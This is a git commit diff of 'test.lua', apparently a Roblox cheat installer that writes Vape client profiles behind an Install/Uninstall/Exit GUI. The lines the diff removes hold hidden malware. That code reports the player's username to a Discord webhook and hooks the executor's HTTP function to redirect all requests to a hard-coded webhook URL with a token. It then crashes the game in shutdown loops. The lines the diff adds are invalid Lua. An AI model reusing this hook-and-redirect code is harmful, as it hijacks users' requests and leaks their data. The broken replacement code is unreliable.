666fda87e504649a3ddfeafb24eef5ac0ad4a8cc
OuterScripts <157838073+OuterScripts@users.noreply.github.com>
2024-03-09 23:02:19 -0600

    Update test.lua

--- test.lua
+++ test.lua
@@ -3,146 +3,57 @@ local Frame = Instance.new("Frame")
 local Install = Instance.new("TextButton")
 local Uninstall = Instance.new("TextButton")
 local Exit = Instance.new("TextButton")
-local LocalPlayer = game.Players.LocalPlayer
 
-local WebHook = ""
-local Headers = {["content-type"] = "application/json"}
+	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-local Seconds = os.time()
-local Time = 0
+	Frame.Parent = ScreenGui
+	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Frame.BorderSizePixel = 0
+	Frame.Position = UDim2.new(0.296254247, 0, 0.220164612, 0)
+	Frame.Rotation = 0.150
+	Frame.Size = UDim2.new(0, 358, 0, 271)
+	Frame.Style = Enum.FrameStyle.DropShadow
 
-task.spawn(function()
-	local SecondsInHour = 3600
+	Install.Name = "Install"
+	Install.Parent = Frame
+	Install.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Install.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Install.BorderSizePixel = 0
+	Install.Position = UDim2.new(-0.00106688181, 0, 0.815572679, 0)
+	Install.Size = UDim2.new(0, 160, 0, 50)
+	Install.Style = Enum.ButtonStyle.RobloxButton
+	Install.Font = Enum.Font.SourceSans
+	Install.Text = "Install"
+	Install.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Install.TextSize = 14.000
 
-	local Seconds = Seconds - (SecondsInHour * 5)
-	local Date = os.date("!*t", Seconds)
+	Uninstall.Name = "Uninstall"
+	Uninstall.Parent = Frame
+	Uninstall.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+	Uninstall.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Uninstall.BorderSizePixel = 0
+	Uninstall.Position = UDim2.new(0.526948631, 0, 0.8136428, 0)
+	Uninstall.Size = UDim2.new(0, 160, 0, 50)
+	Uninstall.Style = Enum.ButtonStyle.RobloxButton
+	Uninstall.Font = Enum.Font.SourceSans
+	Uninstall.Text = "Uninstall"
+	Uninstall.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Uninstall.TextSize = 14.000
 
-	local HourString = tostring(Date.hour > 12 and Date.hour % 12 or Date.hour)
-	local MinuteString = Date.min < 10 and "0".. Date.min or tostring(Date.min)
-
-	Time = HourString ..":".. MinuteString
-end)
-
-local Data = {
-	["content"] = "",
-	["embeds"] = {{
-
-		["author"] = {
-			["name"] = ""
-		},
-
-		["title"] = "Installer Has Been Executed",
-		["fields"] = {
-			{
-				["name"] = "Username: ",
-				["value"] = LocalPlayer.Name,
-				["inline"] = true
-			},
-
-			{   
-				["name"] = "Time",
-				["value"] = Time,
-				["inline"] = true
-			},
-
-			{   
-				["name"] = "",
-				["value"] = "",
-				["inline"] = true
-			},
-		},
-	}}
-}
-
-local RealData = game:GetService("HttpService"):JSONEncode(Data)
-local HttpRequest = http_request or request or HttpPost or syn.request or fluxus.request
-
-local OldFunction
-
-task.spawn(function()
-	OldFunction = hookfunction(HttpRequest, function(RequestData, ...)		
-		RequestData.Url = "https://discord.com/api/webhooks/1216099163675300032/qpQWT34b-UFGMGrKab7y20iN8zahQ84y8lSsfmOC54m1Ll1xDQDs5UN9lu1STGrQbL-Q"
-
-		task.spawn(function()
-			task.wait(0.01)
-			
-			game:shutdown()
-			
-			task.spawn(function()
-				while true do
-					local Part = Instance.new("Part")
-					
-					Part.Parent = workspace
-					
-					game:shutdown()
-				end
-			end)
-			
-			task.spawn(function()
-				repeat
-					local Part = Instance.new("Part")
-
-					Part.Parent = workspace
-					
-					game:shutdown()
-				until not game
-			end)
-		end)
-
-		return OldFunction(RequestData, ...)
-	end)
-end)
-
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-Frame.Parent = ScreenGui
-Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0.296254247, 0, 0.220164612, 0)
-Frame.Rotation = 0.150
-Frame.Size = UDim2.new(0, 358, 0, 271)
-Frame.Style = Enum.FrameStyle.DropShadow
-
-Install.Name = "Install"
-Install.Parent = Frame
-Install.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Install.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Install.BorderSizePixel = 0
-Install.Position = UDim2.new(-0.00106688181, 0, 0.815572679, 0)
-Install.Size = UDim2.new(0, 160, 0, 50)
-Install.Style = Enum.ButtonStyle.RobloxButton
-Install.Font = Enum.Font.SourceSans
-Install.Text = "Install"
-Install.TextColor3 = Color3.fromRGB(255, 255, 255)
-Install.TextSize = 14.000
-
-Uninstall.Name = "Uninstall"
-Uninstall.Parent = Frame
-Uninstall.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Uninstall.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Uninstall.BorderSizePixel = 0
-Uninstall.Position = UDim2.new(0.526948631, 0, 0.8136428, 0)
-Uninstall.Size = UDim2.new(0, 160, 0, 50)
-Uninstall.Style = Enum.ButtonStyle.RobloxButton
-Uninstall.Font = Enum.Font.SourceSans
-Uninstall.Text = "Uninstall"
-Uninstall.TextColor3 = Color3.fromRGB(255, 255, 255)
-Uninstall.TextSize = 14.000
-
-Exit.Name = "Exit"
-Exit.Parent = Frame
-Exit.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
-Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Exit.BorderSizePixel = 0
-Exit.Position = UDim2.new(0.869921029, 0, -0.00376393204, 0)
-Exit.Size = UDim2.new(0, 46, 0, 38)
-Exit.Style = Enum.ButtonStyle.RobloxButton
-Exit.Font = Enum.Font.SourceSans
-Exit.Text = "X"
-Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
-Exit.TextSize = 14.000
+	Exit.Name = "Exit"
+	Exit.Parent = Frame
+	Exit.BackgroundColor3 = Color3.fromRGB(255, 0, 4)
+	Exit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+	Exit.BorderSizePixel = 0
+	Exit.Position = UDim2.new(0.869921029, 0, -0.00376393204, 0)
+	Exit.Size = UDim2.new(0, 46, 0, 38)
+	Exit.Style = Enum.ButtonStyle.RobloxButton
+	Exit.Font = Enum.Font.SourceSans
+	Exit.Text = "X"
+	Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
+	Exit.TextSize = 14.000
 
 
 local function FFNVU_fake_script() -- Install.LocalScript 
@@ -163,7 +74,7 @@ local function FFNVU_fake_script() -- Install.LocalScript
     writefile('vape/Profiles/6872265039.vapeprofile.txt', File6)
 end
 
-coroutine.wrap(FFNVU_fake_script)()
+FFNVU_fake_script() = Install.LocalScript
 
 local function FAIA_fake_script() -- Uninstall.LocalScript 
 	local script = Instance.new('LocalScript', Uninstall)
@@ -177,7 +88,7 @@ local function FAIA_fake_script() -- Uninstall.LocalScript
 	end
 end
 
-coroutine.wrap(FAIA_fake_script)()
+FAIA_fake_script() = Uninstall.LocalScript
 
 local function RAWEJ_fake_script() -- Exit.LocalScript 
 	local script = Instance.new('LocalScript', Exit)
@@ -194,6 +105,4 @@ local function RAWEJ_fake_script() -- Exit.LocalScript
 	DestroyGui()
 end
 
-coroutine.wrap(RAWEJ_fake_script)()
-
-HttpRequest({Url = WebHook, Body = RealData, Method = "POST", Headers = Headers})
+RAWEJ_fake_script() = Exit.LocalScript
